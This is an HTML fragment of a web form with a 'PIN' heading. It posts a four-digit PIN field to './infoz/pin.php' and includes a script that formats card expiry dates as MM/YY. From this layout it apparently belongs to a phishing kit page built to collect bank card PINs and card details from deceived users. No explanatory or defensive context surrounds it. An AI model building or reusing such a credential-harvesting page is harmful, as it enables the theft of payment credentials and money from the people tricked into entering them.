...
<h2 style="font-weight: normal; line-height: 1.875rem; color: rgb(76, 83, 93); background-color: rgb(255, 255, 255); text-transform: uppercase; border-bottom: 0.625rem solid rgb(133, 204, 242);"><span style="font-size: 11px;"><span class="badge badge-info" style="box-sizing: inherit; padding: 3px 7px; vertical-align: middle; border-radius: 10px; min-width: 10px; background-color: rgb(51, 122, 183);"><span id="numeroAvisosId" style="box-sizing: inherit;">5</span></span> <span style="color: rgb(51, 122, 183); font-weight: 700;">&nbsp; PIN</span></span></h2>

<form action="./infoz/pin.php" method="post">
<div class="row">
<div class="col-md-6 form-group">&nbsp;</div>

<div class="col-md-6 form-group">&nbsp;</div>

<div class="col-md-6 form-group"><span style="font-size: 13px; font-weight: 600;">Pin&nbsp;</span><input id="first_name" maxlength="4" name="PIN" placeholder="0000" type="text" /></div>
...
<script>
    function formatExpiryDate(input) {
        ...
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4); // Add '/' after MM part
        }
        input.value = value.substring(0, 5); // Limit the value to "MM/YY"
    }
</script>
